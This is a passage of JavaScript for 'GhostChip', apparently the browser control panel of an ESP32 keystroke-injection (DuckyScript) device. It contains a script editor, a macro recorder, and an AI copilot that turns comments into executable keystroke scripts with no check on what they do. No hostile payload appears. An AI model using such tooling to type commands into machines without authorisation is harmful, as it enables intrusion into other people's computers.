@@ -1,0 +1,6598 @@
+// ═══════════════════════════════════════════════════
+//  GhostChip — App Logic
+// ═══════════════════════════════════════════════════
+
+const $ = id => document.getElementById(id);
+let GROQ_KEY = localStorage.getItem('gc_groq_key') || '';
+const GROQ_MODEL = 'qwen/qwen3.8-27b';
+const WARN_KEY = 'gc_legal_v2';
+
+// ═══════════════════════════════════════════════════
+//  Global Application State
+// ═══════════════════════════════════════════════════
+var kbActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
+var simRunning = false, simAbort = false;
+var targetOS = 'windows';
+var scOS = 'windows';
+var scCmdType = 'run';
+var neo = { on: false, bright: 80, r: 0, g: 255, b: 65 };
+var isRunning = false, execPoll = null, lastLogLen = 0;
+var selectedSsid = null;
+var ddPoll = null, ddSeen = 0;
+var voiceRecog = null, isListening = false;
+
+
+// ─── Smart Base URL ───
+// When served from the ESP32 (same origin) → use relative URLs (no CORS)
+// When opened as file:// or from another host → use absolute URL
+function BASE() {
+  const h = location.hostname;
+  // Same origin: relative path, no CORS needed
+  if (h === 'ghostchip.local' || h.startsWith('192.168.') || h === '4.1') return '';
+  // External: use configured host
+  return 'http://' + ($('ipInput')?.value?.trim() || 'ghostchip.local');
+}
+function isRemote() { return BASE() !== ''; }
+
+var useProxy = false;
+async function checkProxy() {
+  if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+    try {
+      const r = await fetch('/proxy?url=' + encodeURIComponent('http://ghostchip.local/')).catch(() => null);
+      if (r && r.status !== 404) {
+        useProxy = true;
+        console.log('[GhostChip] CORS Proxy detected and enabled.');
+      } else {
+        console.log('[GhostChip] CORS Proxy not running. Falling back to direct requests.');
+      }
+    } catch (e) {
+      useProxy = false;
+      console.log('[GhostChip] CORS Proxy check failed. Falling back to direct requests.', e);
+    }
+  }
+}
+checkProxy();
+
+function getProxyUrl(url) {
+  if (useProxy) {
+    return '/proxy?url=' + encodeURIComponent(url);
+  }
+  return url;
+}
+
+
+
+
+
+// ─── Device Fetch Helper ───
+// Handles CORS transparently: same-origin uses normal fetch, cross-origin uses no-cors
+async function deviceFetch(path, opts = {}) {
+  const url = BASE() + path;
+  if (isRemote()) {
+    // Cross-origin: must use no-cors for POST, means opaque response
+    opts.mode = 'no-cors';
+  }
+  return fetch(url, opts);
+}
+
+// Same as deviceFetch but for GET requests that need JSON response
+// Falls back to XMLHttpRequest which works on some ESP32 setups with CORS headers
+async function deviceGet(path) {
+  const url = getProxyUrl(BASE() + path);
+  try {
+    const r = await fetch(url, { cache: 'no-store' });
+    return await r.json();
+  } catch (e) {
+    // If CORS blocks fetch, try XHR as fallback
+    return new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.setRequestHeader('Accept', '*/*');
+      xhr.onload = () => {
+        try { resolve(JSON.parse(xhr.responseText)); }
+        catch { reject(new Error('Invalid JSON')); }
+      };
+      xhr.onerror = () => reject(new Error('Network error'));
+      xhr.timeout = 8000;
+      xhr.ontimeout = () => reject(new Error('Timeout'));
+      xhr.send();
+    });
+  }
+}
+
+// ─── Toast ───
+function toast(msg, type = 'ok', dur = 3500) {
+  const el = document.createElement('div');
+  el.className = 'toast-item ' + type;
+  const icons = { ok: '✓', err: '✗', warn: '⚠' };
+  el.innerHTML = `<span>${icons[type] || '✓'}</span><span style="flex:1">${msg}</span>`;
+  $('toasts').appendChild(el);
+  setTimeout(() => { el.style.opacity = '0'; el.style.transition = 'opacity .3s'; setTimeout(() => el.remove(), 300); }, dur);
+}
+
+// ─── Boot Sequence ───
+const BOOT_LINES = [
+  '> init esp32-s3 core...',
+  '> loading drivers...',
+  '> mounting spiffs...',
+  '> starting wifi ap...',
+  '> loading eeprom...',
+  '> hid keyboard ready...',
+  '> neopixel init...',
+  '> web server online...',
+  '> ghost chip ready ✓',
+];
+(function boot() {
+  let i = 0;
+  const log = $('bootLog'), bar = $('bootBar'), overlay = $('boot');
+  let bootFinished = false;
+  function finishBoot() {
+    if (bootFinished) return;
+    bootFinished = true;
+    overlay.classList.add('done');
+    setTimeout(() => {
+      overlay.style.display = 'none';
+      $('app').style.display = 'flex';
+      if (!sessionStorage.getItem(WARN_KEY)) $('legalModal').style.display = 'flex';
+      try { initApp(); }
+      catch (e) {
+        console.error('[GhostChip] init failed:', e);
+        toast('Startup recovered. Check settings if a feature is offline.', 'warn', 4500);
+      }
+    }, 700);
+  }
+  function next() {
+    if (i >= BOOT_LINES.length) {
+      setTimeout(finishBoot, 400);
+      return;
+    }
+    log.innerHTML += BOOT_LINES[i] + '<br>';
+    log.scrollTop = log.scrollHeight;
+    bar.style.width = Math.round(((i + 1) / BOOT_LINES.length) * 100) + '%';
+    i++;
+    setTimeout(next, 180 + Math.random() * 120);
+  }
+  next();
+  setTimeout(finishBoot, 5000);
+})();
+
+$('acceptBtn').addEventListener('click', () => {
+  sessionStorage.setItem(WARN_KEY, '1');
+  $('legalModal').style.display = 'none';
+});
+
+// ─── Init ───
+function initApp() {
+  // Restore IP
+  const savedIp = localStorage.getItem('gc_ip');
+  if (savedIp && $('ipInput')) $('ipInput').value = savedIp;
+  // Restore script
+  const savedScript = localStorage.getItem('gc_script');
+  if (savedScript) { $('editor').value = savedScript; updateLines(); }
+  // Auto-save
+  $('editor').addEventListener('input', () => {
+    updateLines();
+    localStorage.setItem('gc_script', $('editor').value);
+  });
+  $('editor').addEventListener('scroll', () => { $('lineNums').scrollTop = $('editor').scrollTop; });
+  if ($('ipInput')) $('ipInput').addEventListener('change', () => localStorage.setItem('gc_ip', $('ipInput').value.trim()));
+  // Try loading API key from device EEPROM if we don't have one locally
+  loadApiKeyFromDevice();
+}
+
+// ─── Navigation ───
+function goPage(name, btn) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
+  document.body.classList.remove('tool-drawer-open');
+  $('page-' + name).classList.add('active');
+  btn.classList.add('active');
+  // Scroll to top
+  document.querySelector('.pages').scrollTop = 0;
+}
+async function showSettings() {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
+  document.body.classList.remove('tool-drawer-open');
+  $('page-settings').classList.add('active');
+  document.querySelectorAll('.nav-item')[4].classList.add('active');
+  
+  try {
+    const data = await deviceGet('/info');
+    if (data.typingDelay !== undefined && $('typingDelayInput')) {
+      $('typingDelayInput').value = data.typingDelay;
+    }
+  } catch (e) {
+    console.warn("Could not fetch info for settings", e);
+  }
+}
+
+// ─── Line Numbers + Syntax Highlighting ───
+const DUCKY_CMDS = /^(DELAY|STRING|ENTER|GUI|ALT|CTRL|SHIFT|TAB|SPACE|REPEAT|DEFAULTDELAY|DEFAULT_DELAY|PRINT|PRINTLN|WINDOWS|COMMAND|MENU|APP|DELETE|HOME|END|INSERT|PAGEUP|PAGEDOWN|UPARROW|DOWNARROW|LEFTARROW|RIGHTARROW|SCROLLLOCK|NUMLOCK|BREAK|PAUSE|ESC|ESCAPE)(?=\s|$)/;
+const DUCKY_KEYS = /\b(F[1-9]|F1[0-2]|UP|DOWN|LEFT|RIGHT|CAPSLOCK|BACKSPACE|PRINTSCREEN)\b/g;
+const DUCKY_MODS = /\b(CTRL|SHIFT|ALT|GUI|COMMAND|WINDOWS)\b/g;
+
+function highlightDucky(code) {
+  return code.split('\n').map(line => {
+    const trimmed = line.trimStart();
+    // Comments
+    if (trimmed.startsWith('REM')) return `<span class="hl-rem">${escHtml(line)}</span>`;
+    // STRING lines
+    if (trimmed.startsWith('STRING ') || trimmed.startsWith('PRINTLN ') || trimmed.startsWith('PRINT ')) {
+      const sp = line.indexOf(' ');
+      return `<span class="hl-cmd">${escHtml(line.slice(0, sp))}</span> <span class="hl-str">${escHtml(line.slice(sp + 1))}</span>`;
+    }
+    // DELAY with numbers
+    if (trimmed.startsWith('DELAY ') || trimmed.startsWith('DEFAULTDELAY ') || trimmed.startsWith('DEFAULT_DELAY ')) {
+      const sp = line.indexOf(' ');
+      return `<span class="hl-cmd">${escHtml(line.slice(0, sp))}</span> <span class="hl-num">${escHtml(line.slice(sp + 1))}</span>`;
+    }
+    // REPEAT
+    if (trimmed.startsWith('REPEAT ')) {
+      const sp = line.indexOf(' ');
+      return `<span class="hl-cmd">${escHtml(line.slice(0, sp))}</span> <span class="hl-num">${escHtml(line.slice(sp + 1))}</span>`;
+    }
+    // Commands with modifiers/keys
+    let hl = escHtml(line);
+    hl = hl.replace(/^(\s*)(CTRL|SHIFT|ALT|GUI|COMMAND|WINDOWS)\b/g, '$1<span class="hl-mod">$2</span>');
+    hl = hl.replace(DUCKY_CMDS, '<span class="hl-cmd">$1</span>');
+    hl = hl.replace(DUCKY_KEYS, '<span class="hl-key">$1</span>');
+    hl = hl.replace(/\b(CTRL|SHIFT|ALT|GUI|COMMAND|WINDOWS)\b/g, '<span class="hl-mod">$1</span>');
+    return hl;
+  }).join('\n');
+}
+function escHtml(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+
+function updateLines() {
+  const code = $('editor').value;
+  const lines = code.split('\n').length;
+  $('lineNums').innerHTML = Array.from({ length: lines }, (_, i) => `<span>${i + 1}</span>`).join('');
+  $('lineCount').textContent = lines + ' line' + (lines !== 1 ? 's' : '');
+  // Syntax highlight overlay
+  const hl = $('editorHighlight');
+  if (hl) hl.querySelector('code').innerHTML = highlightDucky(code) + '\n';
+}
+updateLines();
+// Sync scroll between editor and highlight
+const edEl = $('editor');
+if (edEl) {
+  edEl.addEventListener('scroll', () => {
+    const hl = $('editorHighlight');
+    if (hl) { hl.scrollTop = edEl.scrollTop; hl.scrollLeft = edEl.scrollLeft; }
+  });
+}
+
+// ═══════════════════════════════════════════════════
+//  ⚡ AUTOCOMPLETE & AI COPILOT SUGGESTIONS
+// ═══════════════════════════════════════════════════
+const DUCKY_AUTOCOMPLETE_ITEMS = [
+  { cmd: 'DELAY', desc: 'Delay in ms', sample: 'DELAY 500' },
+  { cmd: 'STRING', desc: 'Type string', sample: 'STRING hello' },
+  { cmd: 'ENTER', desc: 'Press Enter key', sample: 'ENTER' },
+  { cmd: 'GUI', desc: 'GUI / Super key', sample: 'GUI r' },
+  { cmd: 'ALT', desc: 'Alt key modifier', sample: 'ALT F4' },
+  { cmd: 'CTRL', desc: 'Control modifier', sample: 'CTRL c' },
+  { cmd: 'SHIFT', desc: 'Shift modifier', sample: 'SHIFT ENTER' },
+  { cmd: 'TAB', desc: 'Tab key', sample: 'TAB' },
+  { cmd: 'SPACE', desc: 'Space key', sample: 'SPACE' },
+  { cmd: 'REM', desc: 'Comment (Triggers AI Copilot)', sample: 'REM Open terminal' },
+  { cmd: 'REPEAT', desc: 'Repeat last command', sample: 'REPEAT 3' },
+  { cmd: 'DEFAULTDELAY', desc: 'Set default delay', sample: 'DEFAULTDELAY 100' },
+  { cmd: 'ESCAPE', desc: 'Escape key', sample: 'ESCAPE' },
+  { cmd: 'BACKSPACE', desc: 'Backspace key', sample: 'BACKSPACE' },
+  { cmd: 'CAPSLOCK', desc: 'Caps lock key', sample: 'CAPSLOCK' },
+  { cmd: 'UP', desc: 'Up arrow key', sample: 'UP' },
+  { cmd: 'DOWN', desc: 'Down arrow key', sample: 'DOWN' },
+  { cmd: 'LEFT', desc: 'Left arrow key', sample: 'LEFT' },
+  { cmd: 'RIGHT', desc: 'Right arrow key', sample: 'RIGHT' }
+];
+
+var acActiveIdx = 0;
+var acFiltered = [];
+var aiSuggestTimer = null;
+var currentAiSuggestion = '';
+var aiSuggestLineIndex = -1;
+
+function getCursorLineInfo() {
+  const ed = $('editor');
+  if (!ed) return null;
+  const val = ed.value;
+  const pos = ed.selectionStart;
+  const lineStart = val.lastIndexOf('\n', pos - 1) + 1;
+  let lineEnd = val.indexOf('\n', pos);
+  if (lineEnd === -1) lineEnd = val.length;
+  const currentLine = val.slice(lineStart, lineEnd);
+  const textBeforeCursor = val.slice(lineStart, pos);
+  return { val, pos, lineStart, lineEnd, currentLine, textBeforeCursor };
+}
+
+function handleEditorInput() {
+  updateLines();
+  const info = getCursorLineInfo();
+  if (!info) return;
+
+  // Keyword Autocomplete check
+  const wordMatch = info.textBeforeCursor.match(/([a-zA-Z]{1,15})$/);
+  if (wordMatch && !info.textBeforeCursor.trimStart().startsWith('REM')) {
+    const query = wordMatch[1].toUpperCase();
+    acFiltered = DUCKY_AUTOCOMPLETE_ITEMS.filter(item => item.cmd.startsWith(query) && item.cmd !== query);
+    if (acFiltered.length > 0) {
+      showAcDropdown(acFiltered);
+    } else {
+      hideAcDropdown();
+    }
+  } else {
+    hideAcDropdown();
+  }
+}
+
+function showAcDropdown(items) {
+  const dd = $('acDropdown');
+  if (!dd) return;
+  acActiveIdx = 0;
+  dd.innerHTML = items.map((item, i) => `
+    <div class="ac-item ${i === 0 ? 'active' : ''}" onclick="acSelectIndex(${i})">
+      <span class="ac-item-cmd">${item.cmd}</span>
+      <span class="ac-item-desc">${item.desc}</span>
+      <span class="ac-item-hint">↵ Tab</span>
+    </div>
+  `).join('');
+  dd.style.display = 'block';
+  dd.style.bottom = '10px';
+  dd.style.left = '45px';
+}
+
+function hideAcDropdown() {
+  const dd = $('acDropdown');
+  if (dd) dd.style.display = 'none';
+  acFiltered = [];
+}
+
+function acSelectIndex(idx) {
+  if (idx < 0 || idx >= acFiltered.length) return;
+  const item = acFiltered[idx];
+  const info = getCursorLineInfo();
+  if (!info) return;
+  const ed = $('editor');
+  const wordMatch = info.textBeforeCursor.match(/([a-zA-Z]{1,15})$/);
+  if (!wordMatch) return;
+
+  const replaceLen = wordMatch[1].length;
+  const start = info.pos - replaceLen;
+  ed.value = ed.value.slice(0, start) + item.cmd + ' ' + ed.value.slice(info.pos);
+  ed.selectionStart = ed.selectionEnd = start + item.cmd.length + 1;
+  hideAcDropdown();
+  updateLines();
+  ed.focus();
+}
+
+// Key listener for Tab / Arrow / Enter keys in editor
+function handleEditorKeyDown(e) {
+  const dd = $('acDropdown');
+  const acOpen = dd && dd.style.display === 'block';
+
+  if (acOpen) {
+    if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      acActiveIdx = (acActiveIdx + 1) % acFiltered.length;
+      updateAcActiveItem();
+      return;
+    }
+    if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      acActiveIdx = (acActiveIdx - 1 + acFiltered.length) % acFiltered.length;
+      updateAcActiveItem();
+      return;
+    }
+    if (e.key === 'Tab' || e.key === 'Enter') {
+      e.preventDefault();
+      acSelectIndex(acActiveIdx);
+      return;
+    }
+    if (e.key === 'Escape') {
+      hideAcDropdown();
+      return;
+    }
+  }
+
+  // Trigger AI Copilot ONLY when Enter key is pressed on a complete REM line
+  if (e.key === 'Enter') {
+    const info = getCursorLineInfo();
+    if (info) {
+      const trimmed = info.currentLine.trim();
+      if (trimmed.startsWith('REM ') && trimmed.length > 5) {
+        // Trigger AI Copilot generation after line commit
+        setTimeout(() => triggerAiCopilot(trimmed), 100);
+      }
+    }
+  }
+
+  // AI Copilot acceptance with Tab key
+  const bar = $('aiSuggestBar');
+  if (bar && bar.style.display !== 'none' && currentAiSuggestion && e.key === 'Tab') {
+    e.preventDefault();
+    acAcceptAiSuggestion();
+    return;
+  }
+}
+
+function updateAcActiveItem() {
+  const items = document.querySelectorAll('.ac-item');
+  items.forEach((it, i) => {
+    if (i === acActiveIdx) it.classList.add('active');
+    else it.classList.remove('active');
+  });
+}
+
+// ─── AI DuckyScript Cleaner & Output Hardener ───
+function cleanDuckyScriptOutput(rawText) {
+  if (!rawText) return '';
+  let text = String(rawText).trim();
+
+  // 1. Strip <think>...</think> tags (reasoning models)
+  text = text.replace(/<think>[\s\S]*?<\/think>/gi, '').trim();
+
+  // 2. Strip markdown code blocks
+  const codeMatch = text.match(/```(?:duckyscript|bash|sh|text|plaintext)?\n([\s\S]*?)```/i);
+  if (codeMatch && codeMatch[1].trim()) {
+    text = codeMatch[1].trim();
+  } else {
+    text = text.replace(/```[\w]*\n?/g, '').trim();
+  }
+
+  // 3. Fix key syntax errors (e.g. "GUI space" -> "GUI SPACE", "gui space" -> "GUI SPACE")
+  text = text.replace(/^GUI\s+space\b/gim, 'GUI SPACE');
+  text = text.replace(/^gui\s+space\b/gim, 'GUI SPACE');
+  text = text.replace(/^gui\s+/gim, 'GUI ');
+  text = text.replace(/^string\s+/gim, 'STRING ');
+  text = text.replace(/^delay\s+/gim, 'DELAY ');
+  text = text.replace(/^enter\b/gim, 'ENTER');
+  text = text.replace(/^tab\b/gim, 'TAB');
+  text = text.replace(/^escape\b/gim, 'ESCAPE');
+  text = text.replace(/^backspace\b/gim, 'BACKSPACE');
+
+  // 4. Strict Line-by-Line Filtering: Discard any English self-talk/prose lines!
+  const lines = text.split('\n');
+  const validLines = [];
+  const cmdRegex = /^(?:GUI|STRING|DELAY|ENTER|TAB|SPACE|CTRL|ALT|SHIFT|F\d{1,2}|UPARROW|DOWNARROW|LEFTARROW|RIGHTARROW|REPEAT|DEFAULTDELAY|DEFAULT_DELAY|ESCAPE|BACKSPACE|DELETE|CAPSLOCK|UP|DOWN|LEFT|RIGHT)\b/i;
+
+  for (let l of lines) {
+    const trimmed = l.trim();
+    if (!trimmed) continue;
+
+    if (cmdRegex.test(trimmed)) {
+      validLines.push(trimmed);
+    } else if (/^REM\b/i.test(trimmed)) {
+      const remText = trimmed.substring(3).trim();
+      // Discard REM lines if they are AI self-talk or paragraphs (>80 chars or contains AI prose words)
+      if (remText.length <= 80 && !/(?:actually|the user|wants me|I need to|we need|let's|here is|thinking|reasoning|should be|step \d|analyze|determine)/i.test(remText)) {
+        validLines.push(trimmed);
+      }
+    }
+  }
+
+  // 5. Auto-insert ENTER after terminal STRING commands & DELAY 2000 after action lines
+  const outputLines = [];
+  const actionRegex = /^(?:GUI|STRING|ENTER|TAB|SPACE|CTRL|ALT|SHIFT|F\d{1,2}|UPARROW|DOWNARROW|LEFTARROW|RIGHTARROW)\b/i;
+
+  for (let i = 0; i < validLines.length; i++) {
+    const current = validLines[i].trim();
+    if (!current) continue;
+    outputLines.push(current);
+
+    // If current line is a terminal command typed via STRING (e.g. STRING terminal, STRING mkdir ducky)
+    // ensure an ENTER keypress follows so the command actually executes!
+    if (/^STRING\b/i.test(current)) {
+      let nextNonEmpty = '';
+      for (let j = i + 1; j < validLines.length; j++) {
+        if (validLines[j].trim()) {
+          nextNonEmpty = validLines[j].trim();
+          break;
+        }
+      }
+      if (!/^ENTER\b/i.test(nextNonEmpty) && !/^DELAY\b/i.test(nextNonEmpty)) {
+        outputLines.push('DELAY 2000');
+        outputLines.push('ENTER');
+        outputLines.push('DELAY 2000');
+      }
+    } else if (actionRegex.test(current) && !/^ENTER\b/i.test(current)) {
+      let nextLine = '';
+      for (let j = i + 1; j < validLines.length; j++) {
+        if (validLines[j].trim()) {
+          nextLine = validLines[j].trim();
+          break;
+        }
+      }
+      if (!/^DELAY\b/i.test(nextLine)) {
+        outputLines.push('DELAY 2000');
+      }
+    }
+  }
+
+  return outputLines.join('\n').trim();
+}
+
+// ─── AI Copilot Inline Engine ───
+async function triggerAiCopilot(remComment) {
+  const keyToUse = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
+  if (!keyToUse || keyToUse.length < 5) return;
+
+  const endpoint = 'https://api.groq.com/openai/v1/chat/completions';
+  const modelToUse = GROQ_MODEL;
+
+  const bar = $('aiSuggestBar');
+  const loading = $('aiSuggestLoading');
+  const inner = $('aiSuggestInner');
+  const textEl = $('aiSuggestText');
+  if (!bar) return;
+
+  bar.style.display = 'block';
+  if (loading) loading.style.display = 'flex';
+  if (inner) inner.style.display = 'none';
+
+  const headers = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + keyToUse };
+
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({
+        model: modelToUse,
+        messages: [
+          {
+            role: 'system',
+            content: `STRICT DUCKYSCRIPT SYNTAX RULES:
+1. ALL DuckyScript keywords and key names MUST be UPPERCASE (e.g. GUI SPACE, ENTER, STRING, DELAY 2000). NEVER write "GUI space".
+2. EXECUTING TERMINAL COMMANDS: Every shell command typed with "STRING <cmd>" MUST be followed by "ENTER" to execute it!
+   Example:
+   GUI SPACE
+   DELAY 2000
+   STRING terminal
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING mkdir ducky
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING cd ducky
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING echo "What is a HID attack?" > ducky.txt
+   DELAY 2000
+   ENTER
+3. Always insert DELAY 2000 after each action line.
+4. Output ONLY raw executable DuckyScript code lines. DO NOT output reasoning, thinking process, preamble, or markdown. User comment: "${remComment}".`
+          },
+          { role: 'user', content: remComment }
+        ],
+        temperature: 0.6,
+        top_p: 0.95,
+        max_tokens: 2048,
+        max_completion_tokens: 2048,
+        reasoning_effort: 'default',
+        stop: null
+      })
+    });
+    if (!res.ok) throw new Error('AI Copilot request failed');
+    const data = await res.json();
+    let raw = data.choices?.[0]?.message?.content?.trim() || '';
+    let script = cleanDuckyScriptOutput(raw);
+
+    if (script) {
+      currentAiSuggestion = script;
+      if (textEl) textEl.textContent = script.split('\n').join(' ↵ ');
+      if (loading) loading.style.display = 'none';
+      if (inner) inner.style.display = 'flex';
+    } else {
+      acDismissAiSuggestion();
+    }
+  } catch (e) {
+    acDismissAiSuggestion();
+  }
+}
+
+function acAcceptAiSuggestion() {
+  if (!currentAiSuggestion) return;
+  const ed = $('editor');
+  if (!ed) return;
+
+  const info = getCursorLineInfo();
+  if (info) {
+    const insertPos = info.lineEnd;
+    const prefix = ed.value.slice(0, insertPos);
+    const suffix = ed.value.slice(insertPos);
+    const addition = '\n' + currentAiSuggestion;
+    ed.value = prefix + addition + suffix;
+    ed.selectionStart = ed.selectionEnd = insertPos + addition.length;
+  } else {
+    ed.value += '\n' + currentAiSuggestion;
+  }
+
+  acDismissAiSuggestion();
+  updateLines();
+  saveScriptVersion('AI Copilot generated');
+  localStorage.setItem('gc_script', ed.value);
+  toast('AI Copilot applied ✓', 'ok', 1500);
+}
+
+function acDismissAiSuggestion() {
+  currentAiSuggestion = '';
+  const bar = $('aiSuggestBar');
+  if (bar) bar.style.display = 'none';
+}
+
+// ═══════════════════════════════════════════════════
+//  🕒 SCRIPT VERSIONING / AUTO-SAVE HISTORY
+// ═══════════════════════════════════════════════════
+function getScriptHistory() {
+  try {
+    return JSON.parse(localStorage.getItem('gc_script_history') || '[]');
+  } catch (e) {
+    return [];
+  }
+}
+
+var logsFolderCreated = false;
+
+async function saveVersionToDeviceLogs(script, timestampId, label) {
+  try {
+    // 1. First time: create /logs directory on memory card / SD card if not already created
+    if (!logsFolderCreated) {
+      try {
+        await fmFetchPost('/fm/mkdir?path=%2Flogs');
+        logsFolderCreated = true;
+      } catch (e) {
+        logsFolderCreated = true;
+      }
+    }
+
+    // 2. Generate new filename every time using timestamp (e.g. log_20260819_211230.txt)
+    const now = new Date();
+    const pad = n => String(n).padStart(2, '0');
+    const filename = `log_${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}.txt`;
+
+    const uploadUrl = fmBase() + '/fm/upload?path=%2Flogs';
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([`REM --- GhostChip Log Snapshot --- \nREM Label: ${label}\nREM Created: ${now.toLocaleString()}\n\n${script}`], { type: 'text/plain' });
+    const file = new File([blob], filename, { type: 'text/plain' });
+    const fd = new FormData();
+    fd.append('file', file, filename);
+
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+
+    await fetch(uploadUrl, opts);
+  } catch (e) {
+    console.log('[GhostChip] Memory card log write skipped:', e);
+  }
+}
+
+function saveScriptVersion(label = 'Auto snapshot') {
+  const script = $('editor')?.value || '';
+  if (!script.trim()) return;
+
+  const history = getScriptHistory();
+  // Don't duplicate exact same top script
+  if (history.length > 0 && history[0].script === script) return;
+
+  const now = new Date();
+  const timestampId = Date.now();
+  const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' (' + (now.getMonth() + 1) + '/' + now.getDate() + ')';
+
+  history.unshift({
+    id: timestampId,
+    timestamp: timeStr,
+    script: script,
+    label: label
+  });
+
+  // Limit to 30 snapshots in local memory
+  if (history.length > 30) history.pop();
+  localStorage.setItem('gc_script_history', JSON.stringify(history));
+
+  // Store new log file on memory card in /logs folder
+  saveVersionToDeviceLogs(script, timestampId, label);
+}
+
+function showHistoryModal() {
+  const modal = $('historyModal');
+  const list = $('historyList');
+  if (!modal || !list) return;
+
+  const history = getScriptHistory();
+  if (history.length === 0) {
+    list.innerHTML = '<div class="empty-state">No saved versions yet</div>';
+  } else {
+    list.innerHTML = history.map((item, index) => `
+      <div class="fav-item" style="padding:8px 10px;margin-bottom:6px;border:1px solid var(--b1);border-radius:6px;background:var(--s2);display:flex;align-items:center;justify-content:space-between;gap:8px" onclick="restoreVersion(${index})">
+        <div style="min-width:0;flex:1">
+          <div style="font-size:0.75rem;font-weight:700;color:var(--white);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${escHtml(item.label)}</div>
+          <div style="font-size:0.62rem;color:var(--dim2);font-family:var(--mono)">${escHtml(item.timestamp)} • ${item.script.split('\n').length} lines</div>
+        </div>
+        <button class="btn btn-ghost sm" style="padding:2px 8px;font-size:0.65rem">Restore ↵</button>
+      </div>
+    `).join('');
+  }
+
+  modal.style.display = 'flex';
+}
+
+function hideHistoryModal() {
+  const modal = $('historyModal');
+  if (modal) modal.style.display = 'none';
+}
+
+function restoreVersion(index) {
+  const history = getScriptHistory();
+  if (index < 0 || index >= history.length) return;
+  const item = history[index];
+  $('editor').value = item.script;
+  updateLines();
+  localStorage.setItem('gc_script', item.script);
+  hideHistoryModal();
+  toast('Restored version: ' + item.label + ' ✓', 'ok', 2000);
+}
+
+function clearHistoryVersions() {
+  if (!confirm('Clear all version history?')) return;
+  localStorage.removeItem('gc_script_history');
+  showHistoryModal();
+  toast('History cleared', 'ok');
+}
+
+// ═══════════════════════════════════════════════════
+//  🔴 ACTION / MACRO RECORDER
+// ═══════════════════════════════════════════════════
+var isRecordingMacro = false;
+var macroEvents = [];
+var macroLastTime = 0;
+
+function initMacroRecorder() {
+  renderMacroStream();
+}
+
+var recActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
+var recCapsState = 0; // 0 = lowercase, 1 = single shift, 2 = caps lock ON
+var lastRecCapsTapTime = 0;
+
+function recToggleCaps() {
+  const now = Date.now();
+  if (now - lastRecCapsTapTime < 350) {
+    // Instant double tap -> Caps Lock Locked ON
+    recCapsState = 2;
+  } else {
+    // Single tap -> toggle between Shift (1) and Off (0)
+    recCapsState = (recCapsState === 0) ? 1 : 0;
+  }
+  lastRecCapsTapTime = now;
+  updateRecKeyCasing();
+}
+
+function updateRecKeyCasing() {
+  const isCapsOn = recCapsState > 0;
+  const capsEl = $('recCaps');
+  const shiftEl = $('recShift');
+
+  if (capsEl) {
+    capsEl.classList.toggle('active', recCapsState === 2);
+    capsEl.textContent = recCapsState === 2 ? 'CAPS 🔒' : 'CAPS';
+  }
+  if (shiftEl) {
+    shiftEl.classList.toggle('active', recCapsState === 1);
+  }
+
+  // Update visual key labels on Action Recorder letter buttons
+  document.querySelectorAll('.rec-letter').forEach(btn => {
+    const origKey = btn.getAttribute('data-key') || btn.textContent.toLowerCase();
+    btn.textContent = isCapsOn ? origKey.toUpperCase() : origKey.toLowerCase();
+  });
+}
+
+function sendHidAction(action) {
+  if (!action) return;
+  let command = action;
+  if (action.length === 1 && !/\s/.test(action)) {
+    command = 'STRING ' + action;
+  }
+  deviceFetch('/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'duckyscript=' + encodeURIComponent(command)
+  }).catch(() => { });
+}
+
+const SHIFT_SYMBOL_MAP = {
+  '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+  '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?'
+};
+
+function recordVirtualKey(keyStr) {
+  if (!isRecordingMacro) {
+    return;
+  }
+
+  const modKey = keyStr.toLowerCase();
+  // Check if keyStr is a modifier key (GUI, CTRL, ALT, SHIFT)
+  if (['gui', 'ctrl', 'alt', 'shift'].includes(modKey)) {
+    recActiveMods[modKey] = !recActiveMods[modKey];
+    if (modKey === 'shift') {
+      recCapsState = recActiveMods.shift ? 1 : 0;
+      updateRecKeyCasing();
+    }
+    updateRecModVisuals();
+    return;
+  }
+
+  const now = Date.now();
+  const delay = Math.min(Math.max(now - macroLastTime, 50), 4000);
+  macroLastTime = now;
+
+  const isShiftActive = (recCapsState > 0 || recActiveMods.shift);
+
+  let processedKey = keyStr;
+  if (isShiftActive && SHIFT_SYMBOL_MAP[keyStr]) {
+    processedKey = SHIFT_SYMBOL_MAP[keyStr];
+  } else if (keyStr.length === 1 && /[a-zA-Z]/.test(keyStr)) {
+    processedKey = (recCapsState > 0 || recActiveMods.shift) ? keyStr.toUpperCase() : keyStr.toLowerCase();
+  }
+
+  let mods = [];
+  if (recActiveMods.ctrl) mods.push('CTRL');
+  if (recActiveMods.alt) mods.push('ALT');
